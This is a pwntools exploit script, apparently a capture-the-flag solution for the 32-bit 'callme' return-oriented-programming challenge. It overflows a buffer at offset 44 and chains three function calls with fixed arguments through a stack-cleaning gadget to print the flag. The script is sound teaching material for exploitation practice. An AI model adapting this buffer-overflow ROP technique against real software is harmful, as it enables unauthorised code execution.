from pwn import *
import warnings

# Binary filename
exe = './callme32'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'info'
warnings.filterwarnings('ignore')

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Start program
io = process()

# EIP/RIP offset
offset = 44

onegadget = 0x080487f9 #  pop esi; pop edi; pop ebp; ret; 
arg1 = 0xdeadbeef
arg2 = 0xcafebabe
arg3 = 0xd00df00d 

callme_one = 0x80484f0
callme_two = 0x8048550
callme_three = 0x80484e0


# Build the payload
payload = flat([
    "A" * offset,
    callme_one,
    onegadget,
    arg1,
    arg2, 
    arg3,
    callme_two,
    onegadget,
    arg1,
    arg2,
    arg3,
    callme_three,
    onegadget,
    arg1,
    arg2,
    arg3
])

# Send the payload
io.sendlineafter(b'>', payload)
io.recvuntil('Thank you!\n')

io.recvline()
io.recvline()

flag = io.recvline()
success(flag)
